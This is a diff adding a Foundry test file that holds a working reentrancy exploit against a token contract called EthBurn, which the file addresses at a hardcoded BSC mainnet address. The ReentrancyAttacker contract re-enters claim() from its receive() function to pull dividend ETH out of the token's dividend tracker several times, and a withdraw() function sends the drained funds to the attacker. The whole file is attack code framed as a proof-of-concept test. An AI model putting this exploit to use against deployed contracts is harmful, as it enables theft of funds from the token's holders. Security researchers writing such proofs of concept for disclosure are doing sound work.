@@ -1,0 +1,181 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+import "forge-std/Test.sol";
+
+// Minimal interfaces for the target
+interface IEthBurn {
+    function claim() external;
+    function dividendTracker() external view returns (address);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IDividendTracker {
+    function distributeDividends() external payable;
+    function withdrawableDividendOf(address owner) external view returns (uint256);
+    function processAccount(address payable account, bool automatic) external returns (bool);
+    function setBalance(address account, uint256 newBalance) external;
+    function excludedFromDividends(address account) external view returns (bool);
+}
+
+contract ReentrancyAttacker {
+    IEthBurn public ethBurn;
+    IDividendTracker public tracker;
+    uint256 public constant REENTRY_COUNT = 3;
+    uint256 public reentryCounter;
+    uint256 public totalDrained;
+    address public owner;
+
+    constructor(address _ethBurn, address payable _tracker) {
+        ethBurn = IEthBurn(_ethBurn);
+        tracker = IDividendTracker(_tracker);
+        owner = msg.sender;
+    }
+
+    // Called to start the exploit
+    function attack() external {
+        // We need to have a small ETH balance to send to tracker during reentrancy
+        // This ETH can be sent beforehand, or we can pass it in.
+        ethBurn.claim();
+    }
+
+    receive() external payable {
+        // Reentrancy: send some ETH to the dividend tracker to increase magnifiedDividendPerShare
+        // then call claim again
+        if (reentryCounter < REENTRY_COUNT) {
+            reentryCounter++;
+            // Send 0.01 ETH to tracker
+            (bool sent, ) = address(tracker).call{value: 0.01 ether}("");
+            require(sent, "Failed to send to tracker");
+            // Reenter claim
+            ethBurn.claim();
+        } else {
+            // No more reentrancy, just keep track of drained amount
+            totalDrained += msg.value;
+        }
+    }
+
+    // Withdraw drained funds
+    function withdraw() external {
+        require(msg.sender == owner);
+        payable(owner).transfer(address(this).balance);
+    }
+
+    function getTotalDrained() external view returns (uint256) {
+        return totalDrained;
+    }
+}
+
+contract ExploitTest is Test {
+    address constant ETHBURN = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
+    // PancakeSwap router on BSC
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    // WBNB
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+    IEthBurn ethBurn = IEthBurn(ETHBURN);
+    IDividendTracker tracker;
+
+    // Attacker address
+    address attacker = address(0x1234);
+
+    function setUp() public {
+        // Label for debugging
+        vm.label(ETHBURN, "EthBurn");
+        vm.label(attacker, "attacker");
+
+        // Get dividend tracker address from EthBurn
+        tracker = IDividendTracker(ethBurn.dividendTracker());
+        vm.label(address(tracker), "DividendTracker");
+
+        // Find the owner by reading storage slot 5 (Ownable._owner)
+        address owner = address(uint160(uint256(vm.load(ETHBURN, bytes32(uint256(5))))));
+        vm.label(owner, "owner");
+        vm.startPrank(owner);
+        // Owner transfers tokens to attacker so attacker has a dividend-eligible balance
+        uint256 transferAmount = 100_000 * 1e18; // > minimumTokenBalanceForDividends (100e18)
+        require(ethBurn.balanceOf(owner) >= transferAmount, "Owner does not have enough tokens");
+        ethBurn.transfer(attacker, transferAmount);
+        vm.stopPrank();
+
+        // Also give attacker some ETH to set up initial deposit into the tracker
+        deal(attacker, 10 ether);
+
+        // Exclude attacker from dividends? No, we want him to be included.
+        // Ensure attacker is not excluded: tracker.excludedFromDividends(attacker) should be false.
+        // We can check, but it's false by default.
+
+        // Pre-seed dividend tracker with some ETH so that there are dividends to withdraw
+        vm.deal(address(tracker), 5 ether);
+        // Also distribute some via distributeDividends to update magnifiedDividendPerShare
+        (bool sent, ) = address(tracker).call{value: 1 ether}(hex"");
+        require(sent, "Failed to seed tracker");
+
+        // Now attacker's withdrawable dividend should be > 0
+        // But we also need to set balance in tracker for attacker. The EthBurn transfer already calls dividendTracker.setBalance.
+        // However, the setBalance might have been called with the balance from the transfer, which is correct.
+        // Check:
+        uint256 wd = tracker.withdrawableDividendOf(attacker);
+        console.log("Initial withdrawable dividends of attacker:", wd);
+        require(wd > 0, "No dividends for attacker");
+    }
+
+    function testReentrancy() public {
+        // Deploy attacker contract
+        ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(ETHBURN, payable(address(tracker)));
+        vm.label(address(reentrancyAttacker), "reentrancyAttacker");
+
+        // Fund attacker contract with some ETH to send during reentrancy
+        vm.deal(address(reentrancyAttacker), 1 ether);
+
+        // Also, we need the attacker to have a balance in EthBurn that tracks dividends.
+        // The attacker address (0x1234) has tokens from setUp, but the reentrancyAttacker is a different contract.
+        // The reentrancyAttacker needs to have a dividend balance itself to claim.
+        // To simplify, we can just have the attacker address (0x1234) be the one that claims and receives the reentrancy.
+        // But receive() needs to be in a contract. Let's transfer tokens from attacker to reentrancyAttacker contract.
+        vm.prank(attacker);
+        IERC20(ETHBURN).transfer(address(reentrancyAttacker), 10_000 * 1e18);
+
+        // Now reentrancyAttacker has tokens and should be eligible for dividends.
+        // However, the dividend tracker's setBalance is called during transfer, so it should be updated.
+        // We can check withdrawable dividends for reentrancyAttacker
+        uint256 wdAttackerContract = tracker.withdrawableDividendOf(address(reentrancyAttacker));
+        console.log("Withdrawable dividends of reentrancyAttacker:", wdAttackerContract);
+        require(wdAttackerContract > 0, "No dividends for reentrancyAttacker");
+
+        // Capture initial balance of the reentrancyAttacker contract (should be 0)
+        uint256 initialBalance = address(reentrancyAttacker).balance;
+        console.log("Initial balance of reentrancyAttacker:", initialBalance);
+
+        // Also note the balance of the dividend tracker before attack
+        uint256 trackerBalanceBefore = address(tracker).balance;
+
+        // Execute the attack
+        reentrancyAttacker.attack();
+
+        // After attack, the reentrancyAttacker should have drained more than expected
+        uint256 finalBalance = address(reentrancyAttacker).balance;
+        uint256 trackerBalanceAfter = address(tracker).balance;
+        uint256 drained = finalBalance - initialBalance;
+
+        console.log("Drained:", drained);
+        console.log("Tracker balance before:", trackerBalanceBefore);
+        console.log("Tracker balance after:", trackerBalanceAfter);
+
+        // Assert that the attacker contract drained more than the initial withdrawable amount (reentrancy)
+        // More than one claim worth
+        assertGt(drained, wdAttackerContract, "Should have drained more than single dividend due to reentrancy");
+
+        // Additional assert: the tracker lost ETH that should have been distributed only once
+        assertLt(trackerBalanceAfter, trackerBalanceBefore - wdAttackerContract, "Tracker should have lost more than one dividend");
+    }
+}
+
+// Minimal ERC20 interface for transfer
+interface IERC20 {
+    function transfer(address to, uint256 value) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+```
